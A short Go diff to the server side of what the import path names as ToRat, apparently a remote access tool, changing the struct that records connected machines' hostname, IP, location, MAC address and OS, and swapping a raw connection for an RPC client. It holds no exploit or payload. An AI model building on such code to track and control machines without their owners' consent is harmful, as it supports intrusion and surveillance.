@@ -1,20 +1,20 @@
 package server
 
 import (
-	"net"
-	"time"
+	"net/rpc"
 
 	"github.com/jinzhu/gorm"
+	"github.com/lu4p/ToRat/models"
 )
 
-type client struct {
+type Client struct {
 	gorm.Model
 	Hostname string
 	Name     string
 	Path     string
 	IP       string
 	Location string
-	LastConn time.Time
+	LastConn int64
 	Active   bool
 	MacAddr  string
 	OS       string
@@ -26,6 +26,7 @@ type client struct {
 
 type activeClient struct {
 	Hostname string
-	Conn     net.Conn
-	Client   *client
+	Dir      models.Dir
+	RPC      *rpc.Client
+	Client   Client
 }
